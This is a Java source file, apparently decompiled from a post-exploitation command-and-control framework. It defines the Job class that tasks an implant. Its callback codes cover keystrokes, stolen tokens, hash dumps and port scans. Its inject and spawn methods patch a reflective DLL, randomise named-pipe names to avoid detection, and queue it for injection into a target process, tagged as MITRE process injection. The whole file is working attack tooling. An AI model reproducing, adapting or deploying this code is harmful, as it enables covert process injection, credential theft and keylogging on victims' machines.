package beacon;

import common.CommonUtils;
import common.ReflectiveDLL;

public abstract class Job {
    public static final int CALLBACK_OUTPUT = 0;
    public static final int CALLBACK_KEYSTROKES = 1;
    public static final int CALLBACK_FILE = 2;
    public static final int CALLBACK_SCREENSHOT = 3;
    public static final int CALLBACK_CLOSE = 4;
    public static final int CALLBACK_READ = 5;
    public static final int CALLBACK_CONNECT = 6;
    public static final int CALLBACK_PING = 7;
    public static final int CALLBACK_FILE_WRITE = 8;
    public static final int CALLBACK_FILE_CLOSE = 9;
    public static final int CALLBACK_PIPE_OPEN = 10;
    public static final int CALLBACK_PIPE_CLOSE = 11;
    public static final int CALLBACK_PIPE_READ = 12;
    public static final int CALLBACK_POST_ERROR = 13;
    public static final int CALLBACK_PIPE_PING = 14;
    public static final int CALLBACK_TOKEN_STOLEN = 15;
    public static final int CALLBACK_TOKEN_GETUID = 16;
    public static final int CALLBACK_PROCESS_LIST = 17;
    public static final int CALLBACK_POST_REPLAY_ERROR = 18;
    public static final int CALLBACK_PWD = 19;
    public static final int CALLBACK_JOBS = 20;
    public static final int CALLBACK_HASHDUMP = 21;
    public static final int CALLBACK_PENDING = 22;
    public static final int CALLBACK_ACCEPT = 23;
    public static final int CALLBACK_NETVIEW = 24;
    public static final int CALLBACK_PORTSCAN = 25;
    public static final int CALLBACK_DEAD = 26;
    public static final int CALLBACK_SSH_STATUS = 27;
    public static final int CALLBACK_CHUNK_ALLOCATE = 28;
    public static final int CALLBACK_CHUNK_SEND = 29;
    public static final int CALLBACK_OUTPUT_OEM = 30;
    public static final int CALLBACK_ERROR = 31;
    public static final int CALLBACK_OUTPUT_UTF8 = 32;
    protected CommandBuilder builder = new CommandBuilder();
    protected TaskBeacon tasker;
    protected String arch = "";
    protected int pid = 0;

    public Job(TaskBeacon tasker) {
        this.tasker = tasker;
    }

    public boolean isInject() {
        return this.pid != 0;
    }

    public int getJobType() {
        return 40;
    }

    public abstract String getDescription();

    public abstract String getShortDescription();

    public abstract String getDLLName();

    public abstract String getPipeName();

    public abstract int getCallbackType();

    public abstract int getWaitTime();

    public String getTactic() {
        return "";
    }

    public byte[] fix(byte[] mydll) {
        return mydll;
    }

    public void inject(int pid, String arch) {
        this.pid = pid;
        this.arch = arch;
        byte[] mydll = CommonUtils.readResource(this.getDLLName());
        if (arch.equals("x64")) {
            mydll = ReflectiveDLL.patchDOSHeaderX64(mydll, 170532320);
            this.builder.setCommand(43);
        } else {
            mydll = ReflectiveDLL.patchDOSHeader(mydll, 170532320);
            this.builder.setCommand(9);
        }
        String pname = "\\\\.\\pipe\\" + CommonUtils.garbage(this.getPipeName());
        mydll = CommonUtils.strrep(mydll, "\\\\.\\pipe\\" + this.getPipeName(), pname);
        mydll = this.fix(mydll);
        this.builder.addInteger(pid);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(mydll));
        byte[] taskA = this.builder.build();
        this.builder.setCommand(this.getJobType());
        this.builder.addInteger(pid);
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addLengthAndString(pname);
        this.builder.addLengthAndString(this.getShortDescription());
        byte[] taskB = this.builder.build();
        this.tasker.task(taskA, taskB, this.getDescription(), this.getTactic() + ", T1055");
    }

    public void spawn(String bid, String arch) {
        this.arch = arch;
        byte[] mydll = CommonUtils.readResource(this.getDLLName());
        if (arch.equals("x64")) {
            mydll = ReflectiveDLL.patchDOSHeaderX64(mydll, 1453503984);
            this.builder.setCommand(44);
        } else {
            mydll = ReflectiveDLL.patchDOSHeader(mydll, 1453503984);
            this.builder.setCommand(1);
        }
        String pname = "\\\\.\\pipe\\" + CommonUtils.garbage(this.getPipeName());
        mydll = CommonUtils.strrep(mydll, "\\\\.\\pipe\\" + this.getPipeName(), pname);
        mydll = this.fix(mydll);
        this.builder.addString(CommonUtils.bString(mydll));
        byte[] taskA = this.builder.build();
        this.builder.setCommand(this.getJobType());
        this.builder.addInteger(0);
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addLengthAndString(pname);
        this.builder.addLengthAndString(this.getShortDescription());
        byte[] taskB = this.builder.build();
        this.tasker.task(bid, taskA, taskB, this.getDescription(), this.getTactic() + ", T1093");
    }
}

